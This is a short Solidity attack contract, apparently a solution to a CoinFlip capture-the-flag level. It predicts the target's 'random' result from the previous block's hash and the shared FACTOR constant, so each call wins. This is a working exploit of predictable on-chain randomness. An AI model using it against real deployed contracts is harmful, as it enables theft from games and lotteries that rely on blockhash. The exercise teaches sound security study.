// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./CoinFlip.sol";

contract Solver {
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlip;
    uint256 public consecutiveWins = 0;

    constructor(address coinFlipAddress) {
        coinFlip = CoinFlip(coinFlipAddress);
    }

    function solve() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        console.log("Solver blockValue: ", blockValue);

        uint256 coin = blockValue / FACTOR;

        bool side = coin == 1 ? true : false;
        coinFlip.flip(side);
        consecutiveWins = coinFlip.consecutiveWins();
        console.log("Consecutive wins: ", coinFlip.consecutiveWins());
    }
}
